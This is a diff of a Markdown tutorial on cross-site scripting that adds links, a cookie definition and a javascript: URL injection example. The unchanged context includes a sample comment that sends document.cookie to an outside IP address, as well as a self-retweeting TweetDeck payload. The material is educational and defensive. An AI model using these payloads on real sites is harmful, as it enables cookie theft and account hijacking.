@@ -15,7 +15,7 @@
 Authors: [Tan Wang Leng](https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md) and [Chester Sng](https://github.com/ChesterSng)
 
 ## What is XSS?
-Cross Site Scripting (XSS) is the most exploited web application vulnerability to date. XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include social-networking sites Twitter, Facebook, MySpace and YouTube.
+Cross Site Scripting (XSS) is the most exploited web application vulnerability in 2017 (based on a <a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">report</a> in 2018). XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include social-networking sites <a href="https://www.symantec.com/connect/blogs/persistent-xss-vulnerability-facebook" target="_blank">Facebook</a> and <a href="https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/" target="_blank">Youtube</a>.
 
 XSS is a type of injection, in which malicious code are injected into trusted websites. XSS flaws that allow these attacks to happen are widespread and can occur anywhere a web application uses input from a user to generate an output on the website without validating it or encoding it. 
 
@@ -45,11 +45,14 @@ That's a very nice picture! <br>
 Good photograph! <br>
 I **like** your photograph!
 
-HTML also supports `<script>`, for you to write JavaScript code on the webpage as well. 
+HTML also supports `<script>`, for you to write `JavaScript` code on the webpage as well. 
 
 *In HTML, anything between `<script>` and `</script>` will be run as `JavaScript`.*
 
 What happens when a malicious user submits the following as a comment?
+
+> A **cookie** is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.
+
 ```html
 This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
 ```
@@ -74,11 +77,11 @@ Therefore, the malicious user has managed to add additional "functionalities" to
 There are no standard definitions, but there are at least two different types of
 XSS:
 
-* Persistent XSS (also known as stored XSS) - The injected JavaScript code gets stored in
-the web server. Example: Posting a malicious JavaScript code into a blog post as
-a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious JavaScript code automatically.
+* Persistent XSS (also known as stored XSS) - The injected `JavaScript` code gets stored in
+the web server. Example: Posting a malicious `JavaScript` code into a blog post as
+a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious `JavaScript` code automatically.
 
-* Non-persistent XSS (also known as reflected XSS) - The JavaScript code is
+* Non-persistent XSS (also known as reflected XSS) - The `JavaScript` code is
 inserted in URL/links of website that accepts URL parameters as input. The input
 is not stored in the server database.
 
@@ -114,7 +117,7 @@ alert('XSS in Tweetdeck')
 </script> ♥
 ```
 
-The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see "♥", the script portion is executed by the browser on the script. Thus, without the `alert()`, the TweetDeck user will not even notice anything.
+The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see "♥", the script portion is executed by the browser on the script. Without `alert()`, the TweetDeck user will not even notice anything.
 
 You can still see this tweet <a href="https://twitter.com/dergeruhn/status/476764918763749376?lang=en" target="_blank">here</a>.
 
@@ -142,6 +145,18 @@ By scanning and parsing the input as HTML, you can
 remove undesired HTML elements, and only allowing certain whitelisted HTML
 elements to be used (e.g. whitelisting only `<b>` and `<i>`).
 
+*Note that these two ways alone are not enough to protect your web application against XSS attacks. Sophisticated attacks will make use of the different possible user inputs to inject code or illegal characters that are not limited to `<script>...</script>`. It is important to note where the user input is going to be generated in the output.*
+
+For example, if you are building a profile page and allow user to add their own links to certain buttons:
+
+`<a href="{user input link}">...</a>`
+
+If a malicious user submits the following as input: 
+
+`javascript:alert("XSS!")`
+
+It will result in the button running the javascript code when pressed → <a href="javascript:alert('XSS!')"><span class="glyphicon glyphicon-user"></span></a> 
+
 You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools: 
 
 1. http://wapiti.sourceforge.net/ (Web Application Vulnerability Scanner)
@@ -155,8 +170,7 @@ Although XSS is the most common web application vulnerability, there are also ma
 
 ![Graphical Statistic](./Images/StatisticGraphic.png)
 
-You can learn about SQL Injection [here](../sqlInjection.html) and Cross Site Request Forgery 
-[here](../crossSiteRequestForgery/crossSiteRequestForgery.html).
+Here, you can see many other web application security vulnerabilities. You can learn about SQL Injection [here](../sqlInjection.html) and Cross Site Request Forgery [here](../crossSiteRequestForgery/crossSiteRequestForgery.html).
 
 ## Resources
 
@@ -169,6 +183,7 @@ References:
 (Description of the two types of XSS attack taken from here)
 1. http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html
 (Origin of the name "Cross Site Scripting")
+1. https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf (Statistical Summary taken from here)
 
 Additional Reading Resources:
 
